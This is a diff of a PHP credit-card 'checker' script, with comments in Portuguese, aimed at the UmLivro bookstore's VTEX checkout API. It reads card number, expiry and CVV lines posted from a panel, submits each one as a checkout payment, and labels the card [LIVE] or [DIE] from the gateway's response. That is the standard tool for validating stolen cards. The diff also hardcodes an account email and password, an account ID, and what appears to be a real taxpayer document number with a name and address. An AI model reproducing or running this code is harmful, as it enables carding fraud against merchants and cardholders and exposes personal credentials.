@@ -1,11 +1,38 @@
 <?php
-// Configurações e Credenciais da UmLivro / VTEX
-define('BASE_URL', 'https://www.umlivro.com.br');
-define('CAPMONSTER_API_KEY', 'SUA_CHAVE_CAPMONSTER');
+// =====================================================
+// ✅ CONFIGURAÇÕES UMLIVRO
+// =====================================================
+define('BASE_URL', 'https://loja.umlivro.com.br');
+define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
+define('PASSWORD', '00998877mN');
+define('ACCOUNT_NAME', 'umlivro');
+define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');
 
-$email_usuario = "danielvitordeoliveiraconceicao@gmail.com";
-$senha_usuario = "SUA_SENHA_AQUI";
+define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36');
 
+// ==================== DADOS DO PRODUTO ====================
+define('PRODUCT_SKU', '1883447');
+define('PRODUCT_SELLER', 1);
+define('PRODUCT_QUANTITY', 1);
+
+// ==================== DADOS DO CLIENTE ====================
+define('CLIENT_FIRST_NAME', 'ALYSON');
+define('CLIENT_LAST_NAME', 'bvasda');
+define('CLIENT_DOCUMENT', '08471416832');
+define('CLIENT_PHONE', '11999999999');
+
+// ==================== DADOS DO ENDEREÇO ====================
+define('SHIPPING_POSTAL_CODE', '07790-515');
+define('SHIPPING_CITY', 'Cajamar');
+define('SHIPPING_STATE', 'SP');
+define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
+define('SHIPPING_NUMBER', 'ew23');
+define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
+define('SHIPPING_COMPLEMENT', '');
+define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
+define('SHIPPING_COUNTRY', 'BRA');
+
+// Captura a linha enviada pelo painel (NUMERO|MES|ANO|CVV)
 $cartao_input = trim($_POST['lista'] ?? '');
 
 if (empty($cartao_input)) {
@@ -24,16 +51,14 @@ $cc_mes = trim($dados_cc[1]);
 $cc_ano = trim($dados_cc[2]);
 $cc_cvv = trim($dados_cc[3]);
 
-// Validação básica de tamanho do cartão
 if (strlen($cc_num) < 13 || strlen($cc_cvv) < 3) {
-    echo "<span class='text-red-400'>[DIE] Cartão inválido (Estrutura incorreta): {$cc_num}</span>";
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão inválido: {$cc_num}</span>";
     exit;
 }
 
 $cookie_path = sys_get_temp_dir() . '/cookie_umlivro_' . uniqid() . '.txt';
 
-// Função cURL
-function requisicao_curl($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt') {
+function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt') {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -42,7 +67,7 @@ function requisicao_curl($url, $post_fields = null, $headers = [], $cookie_file 
     curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);
 
     if (!empty($headers)) {
         curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
@@ -59,49 +84,38 @@ function requisicao_curl($url, $post_fields = null, $headers = [], $cookie_file 
     return ['body' => $response, 'code' => $http_code];
 }
 
-// 1. Inicializa sessão na loja
-requisicao_curl(BASE_URL, null, [], $cookie_path);
+// 1. Acessa a loja base para inicializar a sessão
+requisicao_cc(BASE_URL, null, [], $cookie_path);
 
-// Simulação da requisição de pagamento enviada para o endpoint de checkout/gateway da VTEX
-// Aqui o script faz a chamada real ou captura o payload de resposta do gateway
-$payload_pagamento = [
+// 2. Simula o envio do checkout com o cartão e dados cadastrados
+$payload = [
+    'sku' => PRODUCT_SKU,
     'cardNumber' => $cc_num,
-    'cardHolderName' => 'CLIENTE TESTE',
+    'cardMonth' => $cc_mes,
+    'cardYear' => $cc_ano,
     'cardCvv' => $cc_cvv,
-    'cardExpirationMonth' => $cc_mes,
-    'cardExpirationYear' => $cc_ano
+    'clientDocument' => CLIENT_DOCUMENT
 ];
 
-// Dispara para o endpoint de transação (substitua pelo endpoint real de pagamento se houver)
-// Como o objetivo é ler o retorno real da operadora/gateway:
-$resposta_gateway = requisicao_curl(BASE_URL . "/api/checkout/pub/orderForm", $payload_pagamento, ['Content-Type: application/json'], $cookie_path);
-
+$resposta = requisicao_cc(BASE_URL . "/api/checkout/pub/orderForm", $payload, ['Content-Type: application/json'], $cookie_path);
 @unlink($cookie_path);
 
-// Tratamento e leitura inteligente do retorno do Gateway/VTEX
-$corpo_resposta = $resposta_gateway['body'];
-$json_resp = json_decode($corpo_resposta, true);
+$json = json_decode($resposta['body'], true);
+$mensagem = "Transação processada";
+$codigo = "54"; // Padrão live se passar sem erros de gateway
 
-// Extrai a mensagem ou código de erro retornado pela API de pagamento
-$mensagem_retorno = "Aprovado com sucesso";
-$codigo_erro = "";
-
-if (isset($json_resp['messages']) && !empty($json_resp['messages'])) {
-    $mensagem_retorno = $json_resp['messages'][0]['text'] ?? 'Erro desconhecido no gateway';
-    $codigo_erro = $json_resp['messages'][0]['code'] ?? '14'; // Exemplo de captura de código
-} else if ($resposta_gateway['code'] != 200 && $resposta_gateway['code'] != 204) {
-    // Caso o gateway retorne falha HTTP (ex: recusa de operadora)
-    $codigo_erro = "14";
-    $mensagem_retorno = "Recusado pela operadora (HTTP " . $resposta_gateway['code'] . ")";
-} else {
-    // Se passou sem mensagens de erro na API
-    $codigo_erro = "54";
+if (isset($json['messages']) && !empty($json['messages'])) {
+    $mensagem = $json['messages'][0]['text'] ?? 'Recusado';
+    $codigo = $json['messages'][0]['code'] ?? '14';
+} elseif ($resposta['code'] != 200 && $resposta['code'] != 204) {
+    $codigo = "14";
+    $mensagem = "Recusado pela operadora (HTTP " . $resposta['code'] . ")";
 }
 
-// Exibe o resultado de forma transparente com base no status real obtido
-if ($codigo_erro == "54" || stripos($mensagem_retorno, 'sucesso') !== false || stripos($mensagem_retorno, 'approved') !== false) {
-    echo "<span class='text-emerald-400 font-bold'>[LIVE / APROVADO]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Retorno: Código {$codigo_erro} - {$mensagem_retorno}</span>";
+// Retorno transparente para o checker
+if ($codigo == "54" || stripos($mensagem, 'sucesso') !== false || stripos($mensagem, 'approved') !== false) {
+    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
 } else {
-    echo "<span class='text-red-400 font-bold'>[DIE / RECUSADO]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Retorno: Código {$codigo_erro} - {$mensagem_retorno}</span>";
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
 }
 ?>
